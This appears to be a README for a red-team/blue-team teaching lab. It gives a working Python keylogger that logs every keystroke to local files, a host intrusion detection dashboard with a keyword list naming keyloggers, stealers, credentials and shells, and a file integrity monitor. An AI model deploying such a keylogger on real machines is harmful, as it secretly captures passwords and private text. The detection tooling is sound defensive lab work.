# RED-BLUE

### Step 1: Make a new folder (in downloads folder) and name it SecLab

Ctrl + Shift + p Type: Phyton: Select Interpreter

  Install Required Python Module:
```bash
pip install pynput
```

### Keylogger.py
```bash

from pynput import keyboard
import os
import logging
from datetime import datetime

# Ensure logs folder exists
os.makedirs("logs", exist_ok=True)

# Log file with timestamp
log_file = f"logs/keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Capture key strokes
def on_press(key):
    try:
        logging.info(f"Key: {key.char}")
    except AttributeError:
        logging.info(f"Special: {key}")

# Start keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

To run:

```bash
cd Keylogger
python keylogger.py
```

##CREATE NEW FOLDER "HIDS"

Type in terminal:
```bash
pip install psutil
```

hids.py
```bash
import os
import csv
import time
import psutil
import threading
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from datetime import datetime


APP_TITLE = "HIDS - Host Intrusion Detection System"
LOG_DIR = "../logs"
LOG_FILE = os.path.join(LOG_DIR, "hids_alerts.log")


SUSPICIOUS_KEYWORDS = [
    "keylog",
    "logger",
    "stealer",
    "credential",
    "password",
    "token",
    "inject",
    "hook",
    "payload",
    "backdoor",
    "malware",
    "rat",
    "reverse",
    "shell"
]


TRUSTED_PROCESSES = [
    "explorer.exe",
    "chrome.exe",
    "msedge.exe",
    "firefox.exe",
    "code.exe",
    "python.exe",
    "powershell.exe",
    "cmd.exe",
    "svchost.exe",
    "runtimebroker.exe",
    "searchhost.exe",
    "taskhostw.exe"
]


class ModernHIDSApp:
    def __init__(self, root):
        self.root = root
        self.root.title(APP_TITLE)
        self.root.geometry("1220x720")
        self.root.minsize(1100, 650)
        self.root.configure(bg="#0f172a")

        os.makedirs(LOG_DIR, exist_ok=True)

        self.running = False
        self.monitor_thread = None
        self.seen_alerts = set()

        self.total_processes = tk.StringVar(value="0")
        self.suspicious_count = tk.StringVar(value="0")
        self.alert_count = tk.StringVar(value="0")
        self.cpu_usage = tk.StringVar(value="0%")
        self.memory_usage = tk.StringVar(value="0%")
        self.status_text = tk.StringVar(value="Stopped")
        self.last_update = tk.StringVar(value="Never")
        self.filter_value = tk.StringVar(value="All Processes")
        self.search_value = tk.StringVar(value="")

        self.setup_style()
        self.build_layout()

    def setup_style(self):
        style = ttk.Style()
        style.theme_use("clam")

        style.configure(
            "Treeview",
            background="#111827",
            foreground="#e5e7eb",
            fieldbackground="#111827",
            rowheight=30,
            borderwidth=0,
            font=("Segoe UI", 9)
        )

        style.configure(
            "Treeview.Heading",
            background="#1f2937",
            foreground="#f8fafc",
            font=("Segoe UI", 9, "bold")
        )

        style.map(
            "Treeview",
            background=[("selected", "#2563eb")]
        )

        style.configure(
            "TCombobox",
            fieldbackground="#111827",
            background="#111827",
            foreground="#e5e7eb",
            arrowcolor="#e5e7eb"
        )

    def build_layout(self):
        self.sidebar = tk.Frame(self.root, bg="#020617", width=210)
        self.sidebar.pack(side="left", fill="y")
        self.sidebar.pack_propagate(False)

        self.main = tk.Frame(self.root, bg="#0f172a")
        self.main.pack(side="right", fill="both", expand=True)

        self.build_sidebar()
        self.build_header()
        self.build_cards()
        self.build_process_section()
        self.build_alert_section()
        self.build_footer()

    def build_sidebar(self):
        tk.Label(
            self.sidebar,
            text="🛡  HIDS",
            bg="#020617",
            fg="#f8fafc",
            font=("Segoe UI", 20, "bold")
        ).pack(anchor="w", padx=20, pady=(25, 2))

        tk.Label(
            self.sidebar,
            text="Host Intrusion Detection",
            bg="#020617",
            fg="#94a3b8",
            font=("Segoe UI", 9)
        ).pack(anchor="w", padx=23, pady=(0, 25))

        menu_items = [
            "Dashboard",
            "Live Processes",
            "Alerts",
            "System Info",
            "Logs",
            "Settings",
            "About"
        ]

        for item in menu_items:
            bg = "#1d4ed8" if item == "Dashboard" else "#020617"
            fg = "#ffffff" if item == "Dashboard" else "#cbd5e1"

            tk.Label(
                self.sidebar,
                text=f"   {item}",
                bg=bg,
                fg=fg,
                font=("Segoe UI", 10, "bold" if item == "Dashboard" else "normal"),
                anchor="w",
                padx=10,
                pady=11
            ).pack(fill="x", padx=12, pady=2)

        self.status_box = tk.Frame(
            self.sidebar,
            bg="#052e16",
            highlightbackground="#14532d",
            highlightthickness=1
        )
        self.status_box.pack(side="bottom", fill="x", padx=14, pady=16)

        tk.Label(
            self.status_box,
            textvariable=self.status_text,
            bg="#052e16",
            fg="#22c55e",
            font=("Segoe UI", 10, "bold")
        ).pack(anchor="w", padx=14, pady=(12, 3))

        tk.Label(
            self.status_box,
            text="System monitoring status",
            bg="#052e16",
            fg="#bbf7d0",
            font=("Segoe UI", 8)
        ).pack(anchor="w", padx=14, pady=(0, 12))

    def build_header(self):
        header = tk.Frame(self.main, bg="#0f172a")
        header.pack(fill="x", padx=22, pady=(18, 8))

        left = tk.Frame(header, bg="#0f172a")
        left.pack(side="left")

        tk.Label(
            left,
            text="Host-Based IDS Dashboard",
            bg="#0f172a",
            fg="#f8fafc",
            font=("Segoe UI", 22, "bold")
        ).pack(anchor="w")

        tk.Label(
            left,
            text="Real-time process monitoring, suspicious behavior detection, and alert logging.",
            bg="#0f172a",
            fg="#94a3b8",
            font=("Segoe UI", 10)
        ).pack(anchor="w", pady=(3, 0))

        right = tk.Frame(header, bg="#0f172a")
        right.pack(side="right")

        self.button(right, "▶ Start", self.start_monitoring, "#166534").pack(side="left", padx=5)
        self.button(right, "■ Stop", self.stop_monitoring, "#991b1b").pack(side="left", padx=5)
        self.button(right, "Export Logs", self.export_logs, "#334155").pack(side="left", padx=5)

    def build_cards(self):
        cards = tk.Frame(self.main, bg="#0f172a")
        cards.pack(fill="x", padx=22, pady=10)

        self.card(cards, "Total Processes", self.total_processes, "#38bdf8").pack(side="left", fill="x", expand=True, padx=(0, 8))
        self.card(cards, "Suspicious Processes", self.suspicious_count, "#f87171").pack(side="left", fill="x", expand=True, padx=8)
        self.card(cards, "Total Alerts", self.alert_count, "#facc15").pack(side="left", fill="x", expand=True, padx=8)
        self.card(cards, "CPU Usage", self.cpu_usage, "#22c55e").pack(side="left", fill="x", expand=True, padx=8)
        self.card(cards, "Memory Usage", self.memory_usage, "#c084fc").pack(side="left", fill="x", expand=True, padx=(8, 0))

    def card(self, parent, title, variable, color):
        frame = tk.Frame(parent, bg="#111827", highlightbackground="#1e293b", highlightthickness=1)

        tk.Label(
            frame,
            text=title,
            bg="#111827",
            fg="#94a3b8",
            font=("Segoe UI", 9)
        ).pack(anchor="w", padx=15, pady=(13, 3))

        tk.Label(
            frame,
            textvariable=variable,
            bg="#111827",
            fg=color,
            font=("Segoe UI", 20, "bold")
        ).pack(anchor="w", padx=15)

        tk.Label(
            frame,
            text="Live endpoint metric",
            bg="#111827",
            fg="#64748b",
            font=("Segoe UI", 8)
        ).pack(anchor="w", padx=15, pady=(2, 13))

        return frame

    def build_process_section(self):
        section = tk.Frame(self.main, bg="#111827", highlightbackground="#1e293b", highlightthickness=1)
        section.pack(fill="both", expand=True, padx=22, pady=(8, 10))

        top = tk.Frame(section, bg="#111827")
        top.pack(fill="x", padx=14, pady=(12, 8))

        tk.Label(
            top,
            text="LIVE PROCESS MONITOR",
            bg="#111827",
            fg="#f8fafc",
            font=("Segoe UI", 10, "bold")
        ).pack(side="left")

        self.search_entry = tk.Entry(
            top,
            textvariable=self.search_value,
            bg="#020617",
            fg="#e5e7eb",
            insertbackground="#e5e7eb",
            relief="flat",
            font=("Segoe UI", 9),
            width=28
        )
        self.search_entry.pack(side="right", ipady=6, padx=(8, 0))

        self.filter_box = ttk.Combobox(
            top,
            textvariable=self.filter_value,
            values=["All Processes", "Suspicious Only", "Trusted Only"],
            state="readonly",
            width=18
        )
        self.filter_box.pack(side="right")

        columns = ("time", "process", "pid", "user", "cpu", "memory", "status", "reputation")
        self.process_tree = ttk.Treeview(section, columns=columns, show="headings", height=9)

        headings = {
            "time": "Time",
            "process": "Process Name",
            "pid": "PID",
            "user": "User",
            "cpu": "CPU %",
            "memory": "Memory MB",
            "status": "Status",
            "reputation": "Reputation"
        }

        widths = {
            "time": 110,
            "process": 220,
            "pid": 80,
            "user": 130,
            "cpu": 80,
            "memory": 110,
            "status": 100,
            "reputation": 130
        }

        for col in columns:
            self.process_tree.heading(col, text=headings[col])
            self.process_tree.column(col, width=widths[col], anchor="center")

        self.process_tree.tag_configure("trusted", foreground="#22c55e")
        self.process_tree.tag_configure("suspicious", foreground="#f87171")
        self.process_tree.tag_configure("medium", foreground="#facc15")

        self.process_tree.pack(fill="both", expand=True, padx=14, pady=(0, 14))

    def build_alert_section(self):
        section = tk.Frame(self.main, bg="#111827", highlightbackground="#1e293b", highlightthickness=1)
        section.pack(fill="both", expand=True, padx=22, pady=(0, 10))

        tk.Label(
            section,
            text="RECENT ALERTS",
            bg="#111827",
            fg="#f8fafc",
            font=("Segoe UI", 10, "bold")
        ).pack(anchor="w", padx=14, pady=(12, 8))

        columns = ("time", "type", "process", "pid", "details", "severity")
        self.alert_tree = ttk.Treeview(section, columns=columns, show="headings", height=7)

        headings = {
            "time": "Time",
            "type": "Alert Type",
            "process": "Process",
            "pid": "PID",
            "details": "Details",
            "severity": "Severity"
        }

        widths = {
            "time": 120,
            "type": 170,
            "process": 180,
            "pid": 80,
            "details": 430,
            "severity": 100
        }

        for col in columns:
            self.alert_tree.heading(col, text=headings[col])
            self.alert_tree.column(col, width=widths[col], anchor="center")

        self.alert_tree.tag_configure("High", foreground="#f87171")
        self.alert_tree.tag_configure("Medium", foreground="#facc15")
        self.alert_tree.tag_configure("Low", foreground="#38bdf8")

        self.alert_tree.pack(fill="both", expand=True, padx=14, pady=(0, 14))

    def build_footer(self):
        footer = tk.Frame(self.main, bg="#0f172a")
        footer.pack(fill="x", padx=22, pady=(0, 14))

        tk.Label(
            footer,
            text="Monitoring active:",
            bg="#0f172a",
            fg="#94a3b8",
            font=("Segoe UI", 9)
        ).pack(side="left")

        tk.Label(
            footer,
            textvariable=self.status_text,
            bg="#0f172a",
            fg="#22c55e",
            font=("Segoe UI", 9, "bold")
        ).pack(side="left", padx=(5, 20))

        tk.Label(
            footer,
            text="Last update:",
            bg="#0f172a",
            fg="#94a3b8",
            font=("Segoe UI", 9)
        ).pack(side="left")

        tk.Label(
            footer,
            textvariable=self.last_update,
            bg="#0f172a",
            fg="#e5e7eb",
            font=("Segoe UI", 9)
        ).pack(side="left", padx=5)

        self.button(footer, "Clear Alerts", self.clear_alerts, "#334155").pack(side="right")

    def button(self, parent, text, command, color):
        return tk.Button(
            parent,
            text=text,
            command=command,
            bg=color,
            fg="#ffffff",
            activebackground=color,
            activeforeground="#ffffff",
            relief="flat",
            padx=14,
            pady=8,
            cursor="hand2",
            font=("Segoe UI", 9, "bold")
        )

    def start_monitoring(self):
        if self.running:
            messagebox.showinfo("Already Running", "HIDS monitoring is already active.")
            return

        self.running = True
        self.status_text.set("Monitoring")

        self.monitor_thread = threading.Thread(target=self.monitor_loop, daemon=True)
        self.monitor_thread.start()

        self.add_alert(
            "System Started",
            "HIDS",
            "N/A",
            "Host intrusion detection monitoring started.",
            "Low"
        )

    def stop_monitoring(self):
        self.running = False
        self.status_text.set("Stopped")

        self.add_alert(
            "System Stopped",
            "HIDS",
            "N/A",
            "Host intrusion detection monitoring stopped.",
            "Low"
        )

    def monitor_loop(self):
        while self.running:
            processes = []
            suspicious = 0

            cpu_percent = psutil.cpu_percent(interval=None)
            memory_percent = psutil.virtual_memory().percent

            for proc in psutil.process_iter(["pid", "name", "username", "cmdline", "cpu_percent", "memory_info", "status"]):
                try:
                    info = proc.info

                    pid = info.get("pid", "N/A")
                    name = info.get("name") or "unknown"
                    username = info.get("username") or "N/A"
                    cmdline = " ".join(info.get("cmdline") or [])
                    status = info.get("status") or "running"

                    cpu = proc.cpu_percent(interval=None)
                    memory = 0

                    if info.get("memory_info"):
                        memory = round(info["memory_info"].rss / (1024 * 1024), 2)

                    reputation, severity, reason = self.analyze_process(name, cmdline, cpu, memory)

                    if reputation == "Suspicious":
                        suspicious += 1
                        alert_key = f"{name}-{pid}-{reason}"

                        if alert_key not in self.seen_alerts:
                            self.seen_alerts.add(alert_key)
                            self.add_alert(
                                "Suspicious Process Detected",
                                name,
                                pid,
                                reason,
                                severity
                            )

                    processes.append({
                        "time": datetime.now().strftime("%H:%M:%S"),
                        "name": name,
                        "pid": pid,
                        "user": username.split("\\")[-1] if "\\" in str(username) else username,
                        "cpu": cpu,
                        "memory": memory,
                        "status": status,
                        "reputation": reputation
                    })

                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue
                except Exception:
                    continue

            self.root.after(0, self.update_dashboard, processes, suspicious, cpu_percent, memory_percent)

            time.sleep(2)

    def analyze_process(self, name, cmdline, cpu, memory):
        text = f"{name} {cmdline}".lower()

        for keyword in SUSPICIOUS_KEYWORDS:
            if keyword in text:
                return "Suspicious", "High", f"Process matched suspicious keyword: {keyword}"

        if name.lower() not in TRUSTED_PROCESSES and "python" in text:
            return "Suspicious", "Medium", "Unknown Python-based script is running."

        if cpu >= 50:
            return "Suspicious", "Medium", f"High CPU usage detected: {cpu}%"

        if memory >= 500:
            return "Suspicious", "Medium", f"High memory usage detected: {memory} MB"

        if name.lower() in TRUSTED_PROCESSES:
            return "Trusted", "Low", "Known trusted process."

        return "Normal", "Low", "No suspicious behavior detected."

    def update_dashboard(self, processes, suspicious, cpu, memory):
        for item in self.process_tree.get_children():
            self.process_tree.delete(item)

        filter_mode = self.filter_value.get()
        search_text = self.search_value.get().lower().strip()

        displayed = []

        for proc in processes:
            if filter_mode == "Suspicious Only" and proc["reputation"] != "Suspicious":
                continue

            if filter_mode == "Trusted Only" and proc["reputation"] != "Trusted":
                continue

            if search_text and search_text not in proc["name"].lower():
                continue

            displayed.append(proc)

        displayed = displayed[:120]

        for proc in displayed:
            if proc["reputation"] == "Suspicious":
                tag = "suspicious"
            elif proc["reputation"] == "Trusted":
                tag = "trusted"
            else:
                tag = "medium"

            self.process_tree.insert(
                "",
                "end",
                values=(
                    proc["time"],
                    proc["name"],
                    proc["pid"],
                    proc["user"],
                    proc["cpu"],
                    proc["memory"],
                    proc["status"],
                    proc["reputation"]
                ),
                tags=(tag,)
            )

        self.total_processes.set(str(len(processes)))
        self.suspicious_count.set(str(suspicious))
        self.cpu_usage.set(f"{cpu}%")
        self.memory_usage.set(f"{memory}%")
        self.last_update.set(datetime.now().strftime("%H:%M:%S"))

    def add_alert(self, alert_type, process, pid, details, severity):
        timestamp = datetime.now().strftime("%H:%M:%S")

        self.alert_tree.insert(
            "",
            0,
            values=(timestamp, alert_type, process, pid, details, severity),
            tags=(severity,)
        )

        current_count = int(self.alert_count.get())
        self.alert_count.set(str(current_count + 1))

        with open(LOG_FILE, "a", encoding="utf-8") as file:
            file.write(
                f"[{timestamp}] TYPE={alert_type} PROCESS={process} PID={pid} "
                f"SEVERITY={severity} DETAILS={details}\n"
            )

    def clear_alerts(self):
        for item in self.alert_tree.get_children():
            self.alert_tree.delete(item)

        self.alert_count.set("0")
        self.seen_alerts.clear()

    def export_logs(self):
        file_path = filedialog.asksaveasfilename(
            defaultextension=".csv",
            filetypes=[("CSV File", "*.csv")],
            title="Export HIDS Logs"
        )

        if not file_path:
            return

        with open(file_path, "w", newline="", encoding="utf-8") as file:
            writer = csv.writer(file)
            writer.writerow(["Time", "Alert Type", "Process", "PID", "Details", "Severity"])

            for item in self.alert_tree.get_children():
                writer.writerow(self.alert_tree.item(item)["values"])

        messagebox.showinfo("Export Complete", "HIDS logs exported successfully.")

    def on_close(self):
        self.running = False
        self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    app = ModernHIDSApp(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()

## Fim.py

```bash
import os
import hashlib
import time
from datetime import datetime
import shutil
import threading
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from collections import Counter

LAB_ROOT_DIR = os.path.abspath('.')  # Adjust to specific folder or drive if needed
BACKUP_DIR = "backups"
HASH_DB = "logs/fim_hashes.txt"
ALERT_LOG = "logs/fim_alerts.txt"

os.makedirs("logs", exist_ok=True)
os.makedirs(BACKUP_DIR, exist_ok=True)

def get_hash(path):
    try:
        with open(path, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
    except Exception:
        return None

def load_hashes():
    if not os.path.exists(HASH_DB):
        return {}
    with open(HASH_DB) as f:
        lines = f.read().splitlines()
        hashes = {}
        for line in lines:
            try:
                path, h = line.split(" || ")
                hashes[path] = h
            except Exception:
                continue
        return hashes

def save_hashes(hashes):
    with open(HASH_DB, 'w') as f:
        for path, h in hashes.items():
            f.write(f"{path} || {h}\n")

def log_alert(event, path):
    line = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {event.upper()}: {path}"
    with open(ALERT_LOG, 'a') as f:
        f.write(line + "\n")
    return line

def backup_file(path):
    backup_path = os.path.join(BACKUP_DIR, os.path.relpath(path, LAB_ROOT_DIR).replace(os.sep, "_"))
    try:
        shutil.copy2(path, backup_path)
    except Exception:
        pass

def restore_file(path):
    backup_path = os.path.join(BACKUP_DIR, os.path.relpath(path, LAB_ROOT_DIR).replace(os.sep, "_"))
    if os.path.exists(backup_path):
        try:
            shutil.copy2(backup_path, path)
            return f"Restored: {path} from backup"
        except Exception:
            return "Failed to restore: admin rights or locked file."
    return "No backup available for this file."

def initial_backup(files):
    for path in files:
        backup_file(path)

def get_event_counts():
    if not os.path.exists(ALERT_LOG):
        return Counter()
    with open(ALERT_LOG) as f:
        events = []
        for line in f:
            if ":" in line:
                eventtype = line.split("]")[1].split(":")[0].strip()
                file = ":".join(line.split(":")[2:]).strip()
                events.append((eventtype, file))
        return Counter(events)

class FIMApp:
    def __init__(self, root):
        self.root = root
        self.root.title("File Integrity Monitor - Modern SOC Dashboard")
        self.root.geometry("1250x650")
        style = ttk.Style(self.root)
        style.theme_use("clam")

        title = tk.Label(root, text="Real-Time File Integrity Dashboard", font=("Segoe UI", 22, "bold"), fg="#1976d2")
        title.pack(pady=(14,7))
        sublabel = tk.Label(root, text="Monitoring all changes (add, modify, delete) on all files in your directory and subfolders", 
            font=("Segoe UI", 12), fg="#6d6d6d")
        sublabel.pack(pady=(0,6))

        columns = ("Time", "Event", "File")
        self.tree = ttk.Treeview(root, columns=columns, show="headings", height=24)
        for col in columns:
            self.tree.heading(col, text=col)
            anchor = tk.W if col != "Time" else tk.CENTER
            self.tree.column(col, anchor=anchor)
        self.tree.column("Time", width=170)
        self.tree.column("Event", width=110)
        self.tree.column("File", width=950)
        self.tree.pack(fill=tk.BOTH, expand=True, padx=8)

        button_frame = tk.Frame(root)
        button_frame.pack(pady=(10, 8))

        self.log_button = tk.Button(button_frame, text="View Full Logs", command=self.view_logs, width=17, bg="#eeeeee")
        self.log_button.pack(side=tk.LEFT, padx=8)

        self.clear_button = tk.Button(button_frame, text="Clear Table", command=self.clear_text, width=17, bg="#eeeeee")
        self.clear_button.pack(side=tk.LEFT, padx=8)

        self.export_button = tk.Button(button_frame, text="Export Report", command=self.export_report, width=17, bg="#388e3c", fg="white")
        self.export_button.pack(side=tk.LEFT, padx=8)

        self.restore_button = tk.Button(button_frame, text="Restore Selected File", command=self.restore_selected, width=19, bg="#0d47a1", fg="white")
        self.restore_button.pack(side=tk.LEFT, padx=8)

        self.analytics_button = tk.Button(button_frame, text="Show Analytics", command=self.show_analytics, width=16, bg="#ff9800", fg="white")
        self.analytics_button.pack(side=tk.LEFT, padx=8)

        self.running = True
        self.reported_events = set()
        threading.Thread(target=self.monitor_thread, daemon=True).start()

    def monitor_thread(self):
        previous_hashes = load_hashes()
        while self.running:
            current_hashes = {}
            monitored_files = []
            for rootdir, _, files in os.walk(LAB_ROOT_DIR):
                for file in files:
                    fpath = os.path.join(rootdir, file)
                    if BACKUP_DIR in rootdir or fpath.endswith(HASH_DB) or fpath.endswith(ALERT_LOG):
                        continue
                    h = get_hash(fpath)
                    if h:
                        current_hashes[fpath] = h
                        monitored_files.append(fpath)
            # Initial backup
            if not os.listdir(BACKUP_DIR):
                initial_backup(monitored_files)
            # Deleted events
            for path in previous_hashes:
                if path not in current_hashes:
                    eid = f"deleted:{path}"
                    if eid not in self.reported_events:
                        log_alert("Deleted", path)
                        self.add_event("Deleted", path, "#e53935")
                        self.reported_events.add(eid)
            # Modified events
            for path in previous_hashes:
                if path in current_hashes and current_hashes[path] != previous_hashes[path]:
                    eid = f"modified:{path}"
                    if eid not in self.reported_events:
                        log_alert("Modified", path)
                        self.add_event("Modified", path, "#ffb300")
                        backup_file(path)
                        self.reported_events.add(eid)
            # Added events
            for path in current_hashes:
                if path not in previous_hashes:
                    eid = f"added:{path}"
                    if eid not in self.reported_events:
                        log_alert("Added", path)
                        self.add_event("Added", path, "#43a047")
                        backup_file(path)
                        self.reported_events.add(eid)
            save_hashes(current_hashes)
            previous_hashes = dict(current_hashes)
            time.sleep(1.5)

    def add_event(self, event, file, color="#1976d2"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.tree.insert("", 0, values=(timestamp, event, file), tags=(event,))
        self.tree.tag_configure("Deleted", foreground="#e53935")
        self.tree.tag_configure("Modified", foreground="#ffb300")
        self.tree.tag_configure("Added", foreground="#43a047")
        self.tree.tag_configure("Restored", foreground="#1976d2")

    def clear_text(self):
        for row in self.tree.get_children():
            self.tree.delete(row)

    def view_logs(self):
        if os.path.exists(ALERT_LOG):
            window = tk.Toplevel(self.root)
            window.title("Complete FIM Alert Log")
            txt = scrolledtext.ScrolledText(window, wrap=tk.WORD, height=30, width=120, font=("Consolas", 10))
            txt.pack()
            with open(ALERT_LOG, 'r') as f:
                logs = f.read()
            txt.insert(tk.END, logs if logs else "No logs yet.")
        else:
            messagebox.showinfo("Logs", "No logs file found.")

    def export_report(self):
        if os.path.exists(ALERT_LOG):
            with open(ALERT_LOG, 'r') as f:
                logs = f.read()
            export_path = filedialog.asksaveasfilename(
                defaultextension=".txt",
                filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")],
                title="Export Report As"
            )
            if export_path:
                with open(export_path, 'w') as out_file:
                    out_file.write(logs)
                messagebox.showinfo("Export Successful", f"Report exported to:\n{export_path}")
        else:
            messagebox.showinfo("Export Report", "No logs to export.")

    def restore_selected(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showinfo("Restore File", "Please select a file row to restore.")
            return
        values = self.tree.item(selected[0], 'values')
        filepath = values[2]
        result = restore_file(filepath)
        messagebox.showinfo("Restore File", result)
        if result.startswith("Restored"):
            log_alert("Restored", filepath)
            self.add_event("Restored", filepath, "#1976d2")

    def show_analytics(self):
        counts = get_event_counts()
        file_counter = Counter()
        event_counter = Counter()
        for (event, file), cnt in counts.items():
            file_counter[file] += cnt
            event_counter[event] += cnt
        top_files = file_counter.most_common(5)
        top_events = event_counter.most_common()
        msg = "Top Targeted/Deleted/Modified Files:\n"
        for f, cnt in top_files:
            msg += f"{f} - {cnt} events\n"
        msg += "\nEvent Summary:\n"
        for evt, cnt in top_events:
            msg += f"{evt}: {cnt}\n"
        messagebox.showinfo("FIM Analytics", msg)

    def on_close(self):
        self.running = False
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = FIMApp(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()

```

To run:
```bash
python fim.py
```

#### then create any txt file in the protected files, see the changes in fim_alerts.


